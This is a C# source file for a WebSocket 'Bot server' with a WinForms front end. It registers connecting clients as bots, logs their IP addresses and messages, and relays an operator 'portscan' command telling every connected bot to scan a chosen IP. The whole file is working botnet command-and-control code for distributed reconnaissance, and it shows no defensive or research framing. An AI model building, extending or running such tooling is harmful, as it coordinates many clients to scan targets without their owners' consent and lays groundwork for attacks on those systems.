using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Fleck;
using Newtonsoft.Json.Linq;

namespace WebSocketWinForms
{

    class WSServer
    {
        private List<Bot> Bots;
        private WebSocketServer Server;
        private MainForm Form;

        public WSServer(MainForm form)
        {
            Form = form;
            Bots = new List<Bot>();
        }

        public void Start(string IP, string Port)
        {
            try
            {
                Server = new WebSocketServer("ws://" + IP + ":" + Port);
                Form.AddLogMessage("Bot server started.");

                Server.Start(socket =>
                {
                    socket.OnOpen = () =>
                    {
                        Form.AddLogMessage("+ Client connected: " + socket.ConnectionInfo.ClientIpAddress);
                        Form.AddClient(socket.ConnectionInfo.ClientIpAddress);
                        Bots.Add(new Bot()
                        {
                            Socket = socket,
                            OpenTime = DateTime.Now
                        });
                    };
                    socket.OnClose = () =>
                    {
                        Bot bot = Bots.First(b => b.Socket == socket);

                        Form.AddLogMessage("– Client disconnected: " + socket.ConnectionInfo.ClientIpAddress + "  (connected for : " + (DateTime.Now - bot.OpenTime).TotalSeconds.ToString() + " seconds)");
                        Form.RemoveClient(socket.ConnectionInfo.ClientIpAddress);

                        Bots.Remove(bot);

                    };
                    socket.OnMessage = message =>
                    {
                        Form.AddLogMessage(socket.ConnectionInfo.ClientIpAddress + " says: " + message);
                    };
                });

                string input = Form.GetCommand();

                while (input != "exit")
                {
                    if (input != null)
                    {
                        RunCommand(input);
                    }
                    input = Form.GetCommand();
                }
            }
            catch (Exception)
            {
                Form.AddLogMessage("Error starting WebSocket server");
            }
        }

        private void RunCommand(string input)
        {
            try
            {
                var command = input.Split();

                switch (command[0].ToLower())
                {
                    case "portscan":
                        Bots.ForEach(b => PortScan(b.Socket, command[1]));
                        Form.AddLogMessage("Port scan started on: " + command[1]);
                        break;
                }

            }
            catch (Exception)
            {
                Form.AddLogMessage("Error sending command.");
            }
        }

        private void PortScan(IWebSocketConnection Socket, string IP)
        {
            JObject response = new JObject
            {
                { "Type", "PortScan" },
                { "IP", IP }
            };

            Socket.Send(response.ToString());
        }
    }

    public class Bot
    {
        public IWebSocketConnection Socket { get; set; }
        public DateTime OpenTime { get; set; }
    }
}

